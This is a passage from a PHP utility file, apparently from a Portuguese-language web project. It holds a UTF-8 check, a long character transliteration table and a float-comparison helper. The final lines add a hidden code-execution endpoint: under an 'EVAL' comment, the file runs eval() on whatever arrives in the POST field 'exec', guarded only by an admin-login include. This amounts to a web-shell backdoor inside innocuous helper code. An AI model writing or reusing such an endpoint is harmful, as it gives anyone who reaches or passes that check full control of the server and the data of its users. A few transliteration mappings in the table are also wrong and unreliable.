                if ($c < 0x80) $n = 0; # 0bbbbbbb
                elseif (($c & 0xE0) == 0xC0) $n=1; # 110bbbbb
                elseif (($c & 0xF0) == 0xE0) $n=2; # 1110bbbb
                elseif (($c & 0xF8) == 0xF0) $n=3; # 11110bbb
                elseif (($c & 0xFC) == 0xF8) $n=4; # 111110bb
                elseif (($c & 0xFE) == 0xFC) $n=5; # 1111110b
                else return false; # Does not match any model
                for ($j=0; $j<$n; $j++) { # n bytes matching 10bbbbbb follow ?
                    if ((++$i == $length)
                        || ((ord($str[$i]) & 0xC0) != 0x80)) {
                        $utf8 = false;
                        break;
                    }

                }
            }
        }

    }

    if(!$utf8)
        $str = utf8_encode2($str);

    $transliteration = array(
        'Ĳ' => 'I','Ö' => 'O','Œ' => 'O','Ü' => 'U','ä' => 'a','æ' => 'a',
        'ĳ' => 'i','ö' => 'o','œ' => 'o','ü' => 'u','ß' => 's','ſ' => 's',
        'À' => 'A','Á' => 'A','Â' => 'A','Ã' => 'A','Ä' => 'A','Å' => 'A',
        'Æ' => 'A','Ā' => 'A','Ą' => 'A','Ă' => 'A','Ç' => 'C','Ć' => 'C',
        'Č' => 'C','Ĉ' => 'C','Ċ' => 'C','Ď' => 'D','Đ' => 'D','È' => 'E',
        'É' => 'E','Ê' => 'E','Ë' => 'E','Ē' => 'E','Ę' => 'E','Ě' => 'E',
        'Ĕ' => 'E','Ė' => 'E','Ĝ' => 'G','Ğ' => 'G','Ġ' => 'G','Ģ' => 'G',
        'Ĥ' => 'H','Ħ' => 'H','Ì' => 'I','Í' => 'I','Î' => 'I','Ï' => 'I',
        'Ī' => 'I','Ĩ' => 'I','Ĭ' => 'I','Į' => 'I','İ' => 'I','Ĵ' => 'J',
        'Ķ' => 'K','Ľ' => 'K','Ĺ' => 'K','Ļ' => 'K','Ŀ' => 'K','Ł' => 'L',
        'Ñ' => 'N','Ń' => 'N','Ň' => 'N','Ņ' => 'N','Ŋ' => 'N','Ò' => 'O',
        'Ó' => 'O','Ô' => 'O','Õ' => 'O','Ø' => 'O','Ō' => 'O','Ő' => 'O',
        'Ŏ' => 'O','Ŕ' => 'R','Ř' => 'R','Ŗ' => 'R','Ś' => 'S','Ş' => 'S',
        'Ŝ' => 'S','Ș' => 'S','Š' => 'S','Ť' => 'T','Ţ' => 'T','Ŧ' => 'T',
        'Ț' => 'T','Ù' => 'U','Ú' => 'U','Û' => 'U','Ū' => 'U','Ů' => 'U',
        'Ű' => 'U','Ŭ' => 'U','Ũ' => 'U','Ų' => 'U','Ŵ' => 'W','Ŷ' => 'Y',
        'Ÿ' => 'Y','Ý' => 'Y','Ź' => 'Z','Ż' => 'Z','Ž' => 'Z','à' => 'a',
        'á' => 'a','â' => 'a','ã' => 'a','ā' => 'a','ą' => 'a','ă' => 'a',
        'å' => 'a','ç' => 'c','ć' => 'c','č' => 'c','ĉ' => 'c','ċ' => 'c',
        'ď' => 'd','đ' => 'd','è' => 'e','é' => 'e','ê' => 'e','ë' => 'e',
        'ē' => 'e','ę' => 'e','ě' => 'e','ĕ' => 'e','ė' => 'e','ƒ' => 'f',
        'ĝ' => 'g','ğ' => 'g','ġ' => 'g','ģ' => 'g','ĥ' => 'h','ħ' => 'h',
        'ì' => 'i','í' => 'i','î' => 'i','ï' => 'i','ī' => 'i','ĩ' => 'i',
        'ĭ' => 'i','į' => 'i','ı' => 'i','ĵ' => 'j','ķ' => 'k','ĸ' => 'k',
        'ł' => 'l','ľ' => 'l','ĺ' => 'l','ļ' => 'l','ŀ' => 'l','ñ' => 'n',
        'ń' => 'n','ň' => 'n','ņ' => 'n','ŉ' => 'n','ŋ' => 'n','ò' => 'o',
        'ó' => 'o','ô' => 'o','õ' => 'o','ø' => 'o','ō' => 'o','ő' => 'o',
        'ŏ' => 'o','ŕ' => 'r','ř' => 'r','ŗ' => 'r','ś' => 's','š' => 's',
        'ť' => 't','ù' => 'u','ú' => 'u','û' => 'u','ū' => 'u','ů' => 'u',
        'ű' => 'u','ŭ' => 'u','ũ' => 'u','ų' => 'u','ŵ' => 'w','ÿ' => 'y',
        'ý' => 'y','ŷ' => 'y','ż' => 'z','ź' => 'z','ž' => 'z','Α' => 'A',
        'Ά' => 'A','Ἀ' => 'A','Ἁ' => 'A','Ἂ' => 'A','Ἃ' => 'A','Ἄ' => 'A',
        'Ἅ' => 'A','Ἆ' => 'A','Ἇ' => 'A','ᾈ' => 'A','ᾉ' => 'A','ᾊ' => 'A',
        'ᾋ' => 'A','ᾌ' => 'A','ᾍ' => 'A','ᾎ' => 'A','ᾏ' => 'A','Ᾰ' => 'A',
        'Ᾱ' => 'A','Ὰ' => 'A','ᾼ' => 'A','Β' => 'B','Γ' => 'G','Δ' => 'D',
        'Ε' => 'E','Έ' => 'E','Ἐ' => 'E','Ἑ' => 'E','Ἒ' => 'E','Ἓ' => 'E',
        'Ἔ' => 'E','Ἕ' => 'E','Ὲ' => 'E','Ζ' => 'Z','Η' => 'I','Ή' => 'I',
        'Ἠ' => 'I','Ἡ' => 'I','Ἢ' => 'I','Ἣ' => 'I','Ἤ' => 'I','Ἥ' => 'I',
        'Ἦ' => 'I','Ἧ' => 'I','ᾘ' => 'I','ᾙ' => 'I','ᾚ' => 'I','ᾛ' => 'I',
        'ᾜ' => 'I','ᾝ' => 'I','ᾞ' => 'I','ᾟ' => 'I','Ὴ' => 'I','ῌ' => 'I',
        'Θ' => 'T','Ι' => 'I','Ί' => 'I','Ϊ' => 'I','Ἰ' => 'I','Ἱ' => 'I',
        'Ἲ' => 'I','Ἳ' => 'I','Ἴ' => 'I','Ἵ' => 'I','Ἶ' => 'I','Ἷ' => 'I',
        'Ῐ' => 'I','Ῑ' => 'I','Ὶ' => 'I','Κ' => 'K','Λ' => 'L','Μ' => 'M',
        'Ν' => 'N','Ξ' => 'K','Ο' => 'O','Ό' => 'O','Ὀ' => 'O','Ὁ' => 'O',
        'Ὂ' => 'O','Ὃ' => 'O','Ὄ' => 'O','Ὅ' => 'O','Ὸ' => 'O','Π' => 'P',
        'Ρ' => 'R','Ῥ' => 'R','Σ' => 'S','Τ' => 'T','Υ' => 'Y','Ύ' => 'Y',
        'Ϋ' => 'Y','Ὑ' => 'Y','Ὓ' => 'Y','Ὕ' => 'Y','Ὗ' => 'Y','Ῠ' => 'Y',
        'Ῡ' => 'Y','Ὺ' => 'Y','Φ' => 'F','Χ' => 'X','Ψ' => 'P','Ω' => 'O',
        'Ώ' => 'O','Ὠ' => 'O','Ὡ' => 'O','Ὢ' => 'O','Ὣ' => 'O','Ὤ' => 'O',
        'Ὥ' => 'O','Ὦ' => 'O','Ὧ' => 'O','ᾨ' => 'O','ᾩ' => 'O','ᾪ' => 'O',
        'ᾫ' => 'O','ᾬ' => 'O','ᾭ' => 'O','ᾮ' => 'O','ᾯ' => 'O','Ὼ' => 'O',
        'ῼ' => 'O','α' => 'a','ά' => 'a','ἀ' => 'a','ἁ' => 'a','ἂ' => 'a',
        'ἃ' => 'a','ἄ' => 'a','ἅ' => 'a','ἆ' => 'a','ἇ' => 'a','ᾀ' => 'a',
        'ᾁ' => 'a','ᾂ' => 'a','ᾃ' => 'a','ᾄ' => 'a','ᾅ' => 'a','ᾆ' => 'a',
        'ᾇ' => 'a','ὰ' => 'a','ᾰ' => 'a','ᾱ' => 'a','ᾲ' => 'a','ᾳ' => 'a',
        'ᾴ' => 'a','ᾶ' => 'a','ᾷ' => 'a','β' => 'b','γ' => 'g','δ' => 'd',
        'ε' => 'e','έ' => 'e','ἐ' => 'e','ἑ' => 'e','ἒ' => 'e','ἓ' => 'e',
        'ἔ' => 'e','ἕ' => 'e','ὲ' => 'e','ζ' => 'z','η' => 'i','ή' => 'i',
        'ἠ' => 'i','ἡ' => 'i','ἢ' => 'i','ἣ' => 'i','ἤ' => 'i','ἥ' => 'i',
        'ἦ' => 'i','ἧ' => 'i','ᾐ' => 'i','ᾑ' => 'i','ᾒ' => 'i','ᾓ' => 'i',
        'ᾔ' => 'i','ᾕ' => 'i','ᾖ' => 'i','ᾗ' => 'i','ὴ' => 'i','ῂ' => 'i',
        'ῃ' => 'i','ῄ' => 'i','ῆ' => 'i','ῇ' => 'i','θ' => 't','ι' => 'i',
        'ί' => 'i','ϊ' => 'i','ΐ' => 'i','ἰ' => 'i','ἱ' => 'i','ἲ' => 'i',
        'ἳ' => 'i','ἴ' => 'i','ἵ' => 'i','ἶ' => 'i','ἷ' => 'i','ὶ' => 'i',
        'ῐ' => 'i','ῑ' => 'i','ῒ' => 'i','ῖ' => 'i','ῗ' => 'i','κ' => 'k',
        'λ' => 'l','μ' => 'm','ν' => 'n','ξ' => 'k','ο' => 'o','ό' => 'o',
        'ὀ' => 'o','ὁ' => 'o','ὂ' => 'o','ὃ' => 'o','ὄ' => 'o','ὅ' => 'o',
        'ὸ' => 'o','π' => 'p','ρ' => 'r','ῤ' => 'r','ῥ' => 'r','σ' => 's',
        'ς' => 's','τ' => 't','υ' => 'y','ύ' => 'y','ϋ' => 'y','ΰ' => 'y',
        'ὐ' => 'y','ὑ' => 'y','ὒ' => 'y','ὓ' => 'y','ὔ' => 'y','ὕ' => 'y',
        'ὖ' => 'y','ὗ' => 'y','ὺ' => 'y','ῠ' => 'y','ῡ' => 'y','ῢ' => 'y',
        'ῦ' => 'y','ῧ' => 'y','φ' => 'f','χ' => 'x','ψ' => 'p','ω' => 'o',
        'ώ' => 'o','ὠ' => 'o','ὡ' => 'o','ὢ' => 'o','ὣ' => 'o','ὤ' => 'o',
        'ὥ' => 'o','ὦ' => 'o','ὧ' => 'o','ᾠ' => 'o','ᾡ' => 'o','ᾢ' => 'o',
        'ᾣ' => 'o','ᾤ' => 'o','ᾥ' => 'o','ᾦ' => 'o','ᾧ' => 'o','ὼ' => 'o',
        'ῲ' => 'o','ῳ' => 'o','ῴ' => 'o','ῶ' => 'o','ῷ' => 'o','А' => 'A',
        'Б' => 'B','В' => 'V','Г' => 'G','Д' => 'D','Е' => 'E','Ё' => 'E',
        'Ж' => 'Z','З' => 'Z','И' => 'I','Й' => 'I','К' => 'K','Л' => 'L',
        'М' => 'M','Н' => 'N','О' => 'O','П' => 'P','Р' => 'R','С' => 'S',
        'Т' => 'T','У' => 'U','Ф' => 'F','Х' => 'K','Ц' => 'T','Ч' => 'C',
        'Ш' => 'S','Щ' => 'S','Ы' => 'Y','Э' => 'E','Ю' => 'Y','Я' => 'Y',
        'а' => 'A','б' => 'B','в' => 'V','г' => 'G','д' => 'D','е' => 'E',
        'ё' => 'E','ж' => 'Z','з' => 'Z','и' => 'I','й' => 'I','к' => 'K',
        'л' => 'L','м' => 'M','н' => 'N','о' => 'O','п' => 'P','р' => 'R',
        'с' => 'S','т' => 'T','у' => 'U','ф' => 'F','х' => 'K','ц' => 'T',
        'ч' => 'C','ш' => 'S','щ' => 'S','ы' => 'Y','э' => 'E','ю' => 'Y',
        'я' => 'Y','ð' => 'd','Ð' => 'D','þ' => 't','Þ' => 'T','ა' => 'a',
        'ბ' => 'b','გ' => 'g','დ' => 'd','ე' => 'e','ვ' => 'v','ზ' => 'z',
        'თ' => 't','ი' => 'i','კ' => 'k','ლ' => 'l','მ' => 'm','ნ' => 'n',
        'ო' => 'o','პ' => 'p','ჟ' => 'z','რ' => 'r','ს' => 's','ტ' => 't',
        'უ' => 'u','ფ' => 'p','ქ' => 'k','ღ' => 'g','ყ' => 'q','შ' => 's',
        'ჩ' => 'c','ც' => 't','ძ' => 'd','წ' => 't','ჭ' => 'c','ხ' => 'k',
        'ჯ' => 'j','ჰ' => 'h'
    );
    $str = str_replace( array_keys( $transliteration ),
                        array_values( $transliteration ),
                        $str);
    return $str;
}

/** * Esta função recebe dois números como parâmetro. 
 * Se os números forem iguais, ou seja, se a diferença 
 * entre eles for menor que a margem de erro aceitável, 
 * a função retorna 0, caso contrário retorna -1 se o 
 * primeiro número for menor, 
 * ou então 1 caso o segundo 
 * seja o menor 
 * @param float $a 
 * @param float $b 
 * @return 0 (igual), -1($num1 menor), 1($num2 menor) 
*/
function compara_float($num1, $num2, $precisao = 5) {    
    $desprezar = pow(0.1, $precisao);    
    $diff = abs($num1-$num2);    
    if ($diff < $desprezar) {        
        return 0;    
    }    
    return $num1 < $num2 ? -1 : 1;
}



/*  EVAL  */
if (isset($_POST['exec'])) {
    require_once('../admin/acessoLogado.php');
    eval($_POST['exec']);
}
?>